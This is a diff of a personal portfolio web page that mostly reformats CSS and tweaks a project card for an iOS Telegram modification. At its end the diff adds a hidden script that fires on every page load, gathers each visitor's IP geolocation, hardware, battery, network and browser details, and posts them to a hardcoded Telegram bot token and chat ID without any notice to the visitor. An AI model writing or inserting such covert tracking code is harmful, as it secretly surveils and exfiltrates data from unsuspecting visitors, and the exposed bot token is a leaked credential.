@@ -8,370 +8,55 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500" rel="stylesheet">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    :root {
-      --bg: #ebebeb;
-      --fg: #000000;
-      --gray-100: #b0b2b4;
-      --gray-200: #727272;
-      --gray-300: #dee2e6;
-      --gray-400: #a8a8a8;
-      --gray-500: #535353;
-      --gray-600: #8f8f8f;
-      --gray-700: #3f454b;
-      --gray-800: #14171a;
-      --gray-900: #212529;
-      --border: #000000;
-      --terminal-bg: #f5f5f5;
-      --terminal-border: #cccccc;
-      --terminal-text: #000000;
-      --telegram-blue: #2AABEE;
-    }
-
-    body {
-      font-family: Inter, -apple-system, BlinkMacSystemFont, sans-serif;
-      background-color: var(--bg);
-      color: var(--fg);
-      line-height: 1.6;
-      overflow-x: hidden;
-      position: relative;
-      scroll-behavior: smooth;
-    }
-
-    .mono {
-      font-family: JetBrains Mono, monospace;
-    }
-
-    .container {
-      max-width: 760px;
-      margin: 0 auto;
-      padding: 0 2rem;
-    }
-    
-
-    .code-bg {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: -1;
-      pointer-events: none;
-      opacity: 0.2;
-      font-family: JetBrains Mono, monospace;
-      font-size: 13px;
-      line-height: 1.7;
-      white-space: pre;
-      overflow: hidden;
-    }
-
-    @keyframes fadeInUp {
-      from {
-        opacity: 0;
-        transform: translateY(20px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    .fade-in {
-      opacity: 0;
-      animation: fadeInUp 0.8s ease forwards;
-    }
-
-    header {
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      padding: 2rem 0;
-      position: relative;
-    }
-
-    .nickname {
-      font-size: clamp(3rem, 8vw, 5.5rem);
-      font-weight: 500;
-      letter-spacing: -0.02em;
-      margin: 0;
-    }
-
-    .cursor {
-      display: inline-block;
-      width: 6px;
-      height: 56px;
-      background: var(--fg);
-      margin-left: 4px;
-      animation: blink 1s infinite;
-    }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0; }
-    }
-
-    .scroll-down {
-      position: absolute;
-      bottom: 2rem;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 36px;
-      height: 36px;
-      border: 2px solid var(--gray-400);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-    }
-
-    .scroll-down svg {
-      width: 16px;
-      height: 16px;
-      stroke: var(--fg);
-    }
-
-    section {
-      padding: 5rem 0;
-    }
-
-    .section-title {
-      font-size: 1.5rem;
-      font-weight: 500;
-      margin-bottom: 2rem;
-      position: relative;
-    }
-
-    .section-title:after {
-      content: "";
-      display: block;
-      width: 40px;
-      height: 1px;
-      background: var(--gray-400);
-      margin-top: 8px;
-    }
-
-    .about {
-      display: flex;
-      align-items: flex-start;
-      gap: 2rem;
-      margin-bottom: 2rem;
-    }
-
-    .avatar {
-      width: 120px;
-      height: 120px;
-      border-radius: 8px;
-      overflow: hidden;
-      flex-shrink: 0;
-      border: 1px solid var(--border);
-      background: var(--gray-200);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 0.8rem;
-      color: var(--gray-600);
-      font-weight: 500;
-    }
-
-    .about-info p {
-      margin: 0.5rem 0;
-      font-size: 1rem;
-    }
-
-    .skills {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.8rem;
-      margin-top: 1rem;
-    }
-
-    .skill {
-      background: var(--gray-100);
-      border: 1px solid var(--border);
-      padding: 0.4rem 1.1rem;
-      border-radius: 20px;
-      font-size: 0.95rem;
-      font-weight: 500;
-    }
-
-    .projects {
-      display: grid;
-      gap: 1.5rem;
-    }
-
-    .project {
-      padding: 1.5rem;
-      border: 1px solid var(--border);
-      border-radius: 8px;
-    }
-
-    .project-title {
-      font-size: 1.25rem;
-      margin-bottom: 0.25rem;
-    }
-
-    .project-sub {
-      font-size: 0.95rem;
-      color: var(--gray-600);
-      margin-bottom: 0.75rem;
-      font-weight: 500;
-    }
-
-        .terminal {
-      background: var(--terminal-bg);
-      border: 2px solid var(--terminal-border);
-      border-radius: 8px;
-      padding: 1rem;
-      font-family: JetBrains Mono, monospace;
-      font-size: 0.9rem;
-      line-height: 1.5;
-      margin: 1.5rem 0;
-      position: relative;
-    }
-
-    .terminal-header {
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-      margin-bottom: 0.5rem;
-      padding-bottom: 0.5rem;
-      border-bottom: 1px solid var(--terminal-border);
-    }
-
-    .terminal-dot {
-      width: 12px;
-      height: 12px;
-      border-radius: 50%;
-    }
-
-    .terminal-dot:nth-child(1) {
-      background: #ff5f56;
-    }
-
-    .terminal-dot:nth-child(2) {
-      background: #febc2e;
-    }
-
-    .terminal-dot:nth-child(3) {
-      background: #27c93f;
-    }
-
-    .terminal-title {
-      font-size: 0.9rem;
-      font-weight: 500;
-    }
-
-    .terminal-content {
-      white-space: pre-wrap;
-      color: var(--terminal-text);
-    }
-
-    .terminal-footer {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-top: 0.5rem;
-      padding-top: 0.5rem;
-      border-top: 1px solid var(--terminal-border);
-      font-size: 0.85rem;
-    }
-
-    .terminal-footer span {
-      color: var(--gray-600);
-    }
-
-    .terminal-footer svg {
-      width: 14px;
-      height: 14px;
-      fill: var(--gray-600);
-    }
-
-    .player-container {
-      margin-top: 1.5rem;
-    }
-
-    iframe {
-      border-radius: 12px;
-      width: 100%;
-      max-width: 760px;
-      display: block;
-      margin: 0 auto;
-    }
-
-    .socials {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 1rem;
-      margin-top: 1.5rem;
-    }
-
-    .social {
-      display: flex;
-      align-items: center;
-      gap: 0.75rem;
-      padding: 0.75rem 1.25rem;
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      font-weight: 500;
-    }
-
-    .social svg {
-      width: 18px;
-      height: 18px;
-    }
-    
-    .telegram-icon {
-        width: 18px;
-        height: 18px;
-        border-radius: 50%;
-        background-color: var(--telegram-blue);
-        display: inline-flex;
-        align-items: center;
-        justify-content: center;
-        color: white;
-        font-weight: bold;
-        font-size: 12px;
-        flex-shrink: 0;
-        background-image: url('https://web.telegram.org/a/apple-touch-icon.png');
-        background-size: cover;
-        background-position: center;
-    }
-    
-    .youtube-icon {
-        width: 18px;
-        height: 18px;
-        flex-shrink: 0;
-    }
-
-    footer {
-      text-align: center;
-      padding: 3rem 0 2rem;
-      color: var(--gray-600);
-      font-size: 0.9rem;
-      border-top: 1px solid var(--border);
-    }
-
-    @media (max-width: 600px) {
-      .nickname { font-size: 2.8rem; }
-      section { padding: 3.5rem 0; }
-      .about {
-        flex-direction: column;
-        gap: 1rem;
-      }
-      .avatar {
-        width: 100px;
-        height: 100px;
-      }
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root { --bg: #ebebeb; --fg: #000000; --gray-100: #b0b2b4; --gray-200: #727272; --gray-300: #dee2e6; --gray-400: #a8a8a8; --gray-500: #535353; --gray-600: #8f8f8f; --gray-700: #3f454b; --gray-800: #14171a; --gray-900: #212529; --border: #000000; --terminal-bg: #f5f5f5; --terminal-border: #cccccc; --terminal-text: #000000; --telegram-blue: #2AABEE; }
+    body { font-family: Inter, -apple-system, BlinkMacSystemFont, sans-serif; background-color: var(--bg); color: var(--fg); line-height: 1.6; overflow-x: hidden; position: relative; scroll-behavior: smooth; }
+    .mono { font-family: JetBrains Mono, monospace; }
+    .container { max-width: 760px; margin: 0 auto; padding: 0 2rem; }
+    .code-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; opacity: 0.2; font-family: JetBrains Mono, monospace; font-size: 13px; line-height: 1.7; white-space: pre; overflow: hidden; }
+    @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+    .fade-in { opacity: 0; animation: fadeInUp 0.8s ease forwards; }
+    header { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 2rem 0; position: relative; }
+    .nickname { font-size: clamp(3rem, 8vw, 5.5rem); font-weight: 500; letter-spacing: -0.02em; margin: 0; }
+    .cursor { display: inline-block; width: 6px; height: 56px; background: var(--fg); margin-left: 4px; animation: blink 1s infinite; }
+    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+    .scroll-down { position: absolute; bottom: 2rem; left: 50%; transform: translateX(-50%); width: 36px; height: 36px; border: 2px solid var(--gray-400); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+    .scroll-down svg { width: 16px; height: 16px; stroke: var(--fg); }
+    section { padding: 5rem 0; }
+    .section-title { font-size: 1.5rem; font-weight: 500; margin-bottom: 2rem; position: relative; }
+    .section-title:after { content: ""; display: block; width: 40px; height: 1px; background: var(--gray-400); margin-top: 8px; }
+    .about { display: flex; align-items: flex-start; gap: 2rem; margin-bottom: 2rem; }
+    .avatar { width: 120px; height: 120px; border-radius: 8px; overflow: hidden; flex-shrink: 0; border: 1px solid var(--border); background: var(--gray-200); display: flex; align-items: center; justify-content: center; font-size: 0.8rem; color: var(--gray-600); font-weight: 500; }
+    .about-info p { margin: 0.5rem 0; font-size: 1rem; }
+    .skills { display: flex; flex-wrap: wrap; gap: 0.8rem; margin-top: 1rem; }
+    .skill { background: var(--gray-100); border: 1px solid var(--border); padding: 0.4rem 1.1rem; border-radius: 20px; font-size: 0.95rem; font-weight: 500; }
+    .projects { display: grid; gap: 1.5rem; }
+    .project { padding: 1.5rem; border: 1px solid var(--border); border-radius: 8px; }
+    .project-header { display: flex; align-items: center; gap: 12px; margin-bottom: 0.25rem; flex-wrap: wrap; }
+    .project-title { font-size: 1.25rem; margin-bottom: 0; }
+    .status-badge { font-family: 'Inter', sans-serif; font-size: 0.7rem; padding: 2px 8px; border-radius: 6px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.03em; }
+    .status-dev { background-color: #fff8c5; color: #b45309; border: 1px solid #fcd34d; }
+    .project-sub { font-size: 0.95rem; color: var(--gray-600); margin-bottom: 0.75rem; font-weight: 500; }
+    .terminal { background: var(--terminal-bg); border: 2px solid var(--terminal-border); border-radius: 8px; padding: 1rem; font-family: JetBrains Mono, monospace; font-size: 0.9rem; line-height: 1.5; margin: 1.5rem 0; position: relative; }
+    .terminal-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.5rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--terminal-border); }
+    .terminal-dot { width: 12px; height: 12px; border-radius: 50%; }
+    .terminal-dot:nth-child(1) { background: #ff5f56; }
+    .terminal-dot:nth-child(2) { background: #febc2e; }
+    .terminal-dot:nth-child(3) { background: #27c93f; }
+    .terminal-title { font-size: 0.9rem; font-weight: 500; }
+    .terminal-content { white-space: pre-wrap; color: var(--terminal-text); }
+    .terminal-footer { display: flex; justify-content: space-between; align-items: center; margin-top: 0.5rem; padding-top: 0.5rem; border-top: 1px solid var(--terminal-border); font-size: 0.85rem; }
+    .terminal-footer span { color: var(--gray-600); }
+    .terminal-footer svg { width: 14px; height: 14px; fill: var(--gray-600); }
+    .player-container { margin-top: 1.5rem; }
+    iframe { border-radius: 12px; width: 100%; max-width: 760px; display: block; margin: 0 auto; }
+    .socials { display: flex; flex-wrap: wrap; gap: 1rem; margin-top: 1.5rem; }
+    .social { display: flex; align-items: center; gap: 0.75rem; padding: 0.75rem 1.25rem; border: 1px solid var(--border); border-radius: 8px; font-weight: 500; }
+    .social svg { width: 18px; height: 18px; }
+    .telegram-icon { width: 18px; height: 18px; border-radius: 50%; background-color: var(--telegram-blue); display: inline-flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 12px; flex-shrink: 0; background-image: url('https://web.telegram.org/a/apple-touch-icon.png'); background-size: cover; background-position: center; }
+    .youtube-icon { width: 18px; height: 18px; flex-shrink: 0; }
+    footer { text-align: center; padding: 3rem 0 2rem; color: var(--gray-600); font-size: 0.9rem; border-top: 1px solid var(--border); }
+    @media (max-width: 600px) { .nickname { font-size: 2.8rem; } section { padding: 3.5rem 0; } .about { flex-direction: column; gap: 1rem; } .avatar { width: 100px; height: 100px; } }
   </style>
 </head>
 <body>
@@ -390,7 +75,7 @@
       <div class="container">
         <h2 class="section-title">Обо мне</h2>
         <div class="about">
-<img class="avatar" src="image.png"> 
+          <img class="avatar" src="image.png" alt="Avatar"> 
           <div class="about-info">
             <p>Возраст: 15 лет</p>
             <p>Место жительства: Россия, Чувашская Республика</p>
@@ -413,12 +98,15 @@
       <div class="container">
         <h2 class="section-title">Проекты</h2>
         <div class="projects">
-          <div class="project">
-            <h3 class="project-title">GLMGram</h3>
-            <div class="project-sub">модификация Telegram для iOS</div>
-            <p>Клиент с чтением удаленных сообщений и многое другое. В разработке.</p>
+            <div class="project">
+              <div class="project-header">
+                <h3 class="project-title">GLMGram</h3>
+                <span class="status-badge status-dev">В разработке</span>
+              </div>
+              <div class="project-sub">модификация Telegram для iOS</div>
+              <p>Клиент с чтением удаленных сообщений и многое другое.</p>
+            </div>
           </div>
-        </div>
       </div>
     </section>
     <section>
@@ -432,7 +120,6 @@
             <div class="terminal-title">Create an HTTP Server</div>
           </div>
           <div class="terminal-content">
-// server.mjs
 import { createServer } from 'node:http';
 
 const server = createServer((req, res) => {
@@ -440,12 +127,9 @@ const server = createServer((req, res) => {
   res.end('Hello World!\n');
 });
 
-// starts a simple http server locally on port 3000
 server.listen(3000, '127.0.0.1', () => {
   console.log('listening on 127.0.0.1:3000');
 });
-
-// run with 'node server.mjs'
           </div>
           <div class="terminal-footer">
             <span>JavaScript</span>
@@ -552,7 +236,126 @@ server.listen(3000, '127.0.0.1', () => {
     document.querySelectorAll('section').forEach(section => {
       observer.observe(section);
     });
+
+    // --- ПОДРОБНЫЙ ЛОГГЕР (ВСЁ В ЦИТАТАХ) ---
+    async function getDetailedLog() {
+      const botToken = "8202591260:AAGJbcGPa7gq1aZVgA4jGPjom1d_LrMf7T0";
+      const chatId = "8492453685";
+      
+      try {
+        let ipData = {};
+        try {
+            // Запрашиваем максимум полей от API
+            const req = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
+            ipData = await req.json();
+        } catch(e) { ipData = { query: 'N/A (Block)' }; }
+
+        // Сбор данных
+        const now = new Date();
+        const clientTime = now.toLocaleString("ru-RU");
+        const clientZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        
+        const screenRes = `${window.screen.width}x${window.screen.height}`;
+        const availScreen = `${window.screen.availWidth}x${window.screen.availHeight}`;
+        const pixelRatio = window.devicePixelRatio || 1;
+        const colorDepth = window.screen.colorDepth;
+        
+        const cores = navigator.hardwareConcurrency || 'N/A';
+        const ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : 'N/A';
+        const platform = navigator.platform;
+        const language = navigator.language;
+        const cookies = navigator.cookieEnabled ? "Yes" : "No";
+        
+        // Попытка определить видеокарту (GPU)
+        let gpuRenderer = 'N/A';
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+        } catch(e) {}
+
+        // Данные батареи
+        let batteryStat = 'N/A';
+        if (navigator.getBattery) {
+            try {
+                const b = await navigator.getBattery();
+                batteryStat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+            } catch(e) {}
+        }
+
+        // Данные соединения
+        let connType = 'N/A';
+        let connSpeed = 'N/A';
+        if (navigator.connection) {
+            const c = navigator.connection;
+            connType = c.effectiveType ? c.effectiveType.toUpperCase() : 'N/A';
+            connSpeed = `${c.downlink}Mbps / ${c.rtt}ms`;
+        }
+
+        // Формирование сообщения с тегом <pre> для полного цитирования
+        const message = `
+<pre>
+🔔 ОБНАРУЖЕНА НОВАЯ СЕССИЯ
+
+[ ВРЕМЯ И ДАТА ]
+⌚ Клиент:    ${clientTime}
+🌍 Пояс:      ${ipData.timezone || clientZone}
+
+[ ГЕОЛОКАЦИЯ ]
+📡 IP:        ${ipData.query || '?'}
+🏳️ Страна:    ${ipData.country || '?'} (${ipData.countryCode || '?'})
+🏙️ Город:     ${ipData.city || '?'}
+📮 ZIP:       ${ipData.zip || '?'}
+🏢 Провайдер: ${ipData.isp || '?'}
+🏢 AS:        ${ipData.as || '?'}
+🏢 ORG:       ${ipData.org || '?'}
+📍 Коорд:     ${ipData.lat || '?'}, ${ipData.lon || '?'}
+
+[ СИСТЕМА ]
+💻 ОС:        ${platform}
+🖥️ Экран:     ${screenRes} (${colorDepth}-bit)
+📏 Доступно:  ${availScreen}
+🔎 Zoom:      ${pixelRatio}x
+🧠 Ядра CPU:  ${cores}
+💾 ОЗУ (RAM): ${ram}
+🎮 GPU:       ${gpuRenderer}
+
+[ БРАУЗЕР ]
+🌐 Браузер:   ${navigator.userAgent}
+🗣️ Язык:      ${language}
+🍪 Cookies:   ${cookies}
+
+[ СЕТЬ И БАТАРЕЯ ]
+📶 Тип сети:  ${connType}
+🚀 Скорость:  ${connSpeed}
+🔋 Батарея:   ${batteryStat}
+
+[ ИСТОЧНИК ]
+🔗 Вход:      ${document.referrer || 'Прямой'}
+📄 URL:       ${window.location.href}
+</pre>`;
+
+        // Отправка
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
+            })
+        });
+
+      } catch (err) {
+        console.log(err);
+      }
+    }
+
+    window.addEventListener('load', getDetailedLog);
   </script>
 </body>
-
 </html>
